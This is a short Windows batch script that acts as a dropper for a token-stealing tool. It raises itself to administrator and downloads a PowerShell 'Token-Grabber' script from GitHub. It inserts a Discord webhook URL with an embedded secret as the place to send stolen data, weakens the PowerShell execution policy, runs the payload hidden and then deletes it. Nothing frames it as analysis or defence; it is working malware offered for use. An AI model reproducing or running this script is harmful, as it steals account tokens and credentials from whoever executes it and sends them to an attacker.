@echo off

net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
cd /d %~dp0

:: $t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1178221702736531486/n4BipTtztauX1FFs5dtfL0VbtgBF9Ad9Pw1NxFVY1aiu1Jufu5-HNcYNJxR0fa5py87d' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII
powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1178221702736531486/n4BipTtztauX1FFs5dtfL0VbtgBF9Ad9Pw1NxFVY1aiu1Jufu5-HNcYNJxR0fa5py87d' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
attrib +h +s powershell123.ps1
powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
attrib -h -s powershell123.ps1
del powershell123.ps1 /f /q
timeout 3 > nul
exit